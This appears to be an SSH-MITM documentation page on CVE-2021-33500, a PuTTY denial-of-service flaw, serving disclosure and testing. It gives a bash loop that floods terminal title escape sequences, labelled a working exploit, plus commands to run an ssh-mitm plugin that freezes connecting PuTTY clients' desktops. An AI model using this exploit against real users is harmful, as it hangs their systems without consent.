CVE-2021-33500
==============

.. raw:: html

    <div class="card card-margin">
        <div class="card-header no-border">
            <h5 class="card-title cve-title">CVE-2021-33500</h5>
        </div>
        <div class="card-body pt-0">
            <div class="widget-49">
                <div class="widget-49-title-wrapper">
                    <div class="widget-49-date-primary">
                        <span class="widget-49-date-day">7.5</span>
                        <span class="widget-49-date-month">CVSS</span>
                    </div>
                    <div class="widget-49-meeting-info">
                        <span class="widget-49-pro-title"><b>Vector:</b> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</span>
                        <span class="widget-49-meeting-time">
                            <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33500">https://nvd.nist.gov/vuln/detail/CVE-2021-33500</a>
                        </span>
                    </div>
                </div>
                <p class="widget-49-meeting-integration">
                    <i class="fas fa-check"></i> integrated in <a href="https://github.com/ssh-mitm/ssh-mitm-plugins/blob/main/ssh_mitm_plugins/ssh/putty_dos.py">SSH-MITM plugins</a>
                </p>
                <p class="widget-49-meeting-text">
                PuTTY before 0.75 on Windows allows remote servers to cause a denial of service
                (Windows GUI hang) by telling the PuTTY window to change its title repeatedly at high speed,
                which results in many SetWindowTextA or SetWindowTextW calls.
                </p>
                <p>
                NOTE: the same attack methodology may affect some OS-level GUIs on Linux or other platforms for similar reasons.
                </p>
                <span class="widget-49-pro-title"><b>Affected Software:</b></span>
                <ul class="widget-49-meeting-points">
                    <li class="widget-49-meeting-item"><b>PuTTY</b> &lt; 0.75</li>
                </ul>
            </div>
        </div>
    </div>

Description
-----------

A vulnerability in PuTTY < 0.75 freezes the entire, leading inevitably to a manual restart. This happens when executing
a simple command to repeatedly change the terminals title.

Set window title from terminal:

.. code-block:: bash

    $ PS1=''
    echo -ne "\033]0; NEW_TITLE \007"

Thus, an working exploit would be:

.. code-block:: bash

    $ PS1=''
    while :
    > do
    > echo -ne "\033]0; NEW_TITLE${RANDOM}  \007"
    > done


Using the injection functionality of the mitm Server, this exploit can be executed immediately when a client connects
to the mitm server via PuTTY.

Test with SSH-MITM
------------------

A proof of conecpt exploit is integrated in the extra package ssh-mitm-plugins.

You can install the required extra packages with following command:

.. code-block:: bash

    $ pip install ssh-mitm[plugins]


After installing the plugins you can start ssh-mitm:

.. code-block:: bash

    $ ssh-mitm --ssh-interface puttydos

When you have logged with PuTTy to the ssh-mitm server,
ssh-mitm executed the exploit and PuTTy will freeze the desktop.



Mitigation
----------

Update PuTTY to version >= 0.75
